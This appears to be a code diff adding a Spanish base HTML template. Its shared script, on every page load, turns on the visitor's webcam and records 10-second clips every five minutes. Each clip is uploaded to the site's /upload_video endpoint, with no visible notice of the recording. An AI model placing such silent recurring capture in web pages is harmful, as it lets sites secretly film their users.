@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{% block title %}Página{% endblock %}</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+</head>
+<body>
+    {% block content %}
+    <!-- El contenido de las páginas se renderizará aquí -->
+    {% endblock %}
+
+    <!-- Scripts comunes -->
+    <script>
+        let mediaRecorder, recordedChunks = [], cameraStream;
+
+        async function startCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                setupMediaRecorder();
+                startAnalysisRoutine();
+            } catch (error) {
+                console.error("No se pudo activar la cámara:", error);
+            }
+        }
+
+        function setupMediaRecorder() {
+            mediaRecorder = new MediaRecorder(cameraStream);
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
+                recordedChunks = [];
+                uploadVideo(videoBlob);
+            };
+        }
+
+        function recordVideo() {
+            mediaRecorder.start();
+            setTimeout(() => mediaRecorder.stop(), 10000); // 10 segundos
+        }
+
+        async function uploadVideo(blob) {
+            const formData = new FormData();
+            formData.append('video', blob, 'recorded_video.mp4');
+
+            try {
+                await fetch('/upload_video', {
+                    method: 'POST',
+                    body: formData,
+                });
+            } catch (error) {
+                console.error("Error al subir el video:", error);
+            }
+        }
+
+        function startAnalysisRoutine() {
+            recordVideo(); // Ejecutar inmediatamente
+            setInterval(recordVideo, 300000); // Cada 5 minutos
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            startCamera();
+        });
+    </script>
+</body>
+</html>
